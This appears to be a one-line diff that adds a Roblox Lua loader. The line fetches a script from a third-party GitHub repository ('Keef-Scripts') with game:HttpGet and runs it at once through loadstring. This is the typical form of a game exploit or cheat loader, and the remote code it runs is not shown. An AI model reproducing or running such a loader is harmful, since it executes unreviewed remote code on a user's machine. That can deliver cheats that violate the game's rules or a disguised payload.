@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Extendoze/Keef-Scripts/BigBoiScripts/DBOG'),true))()
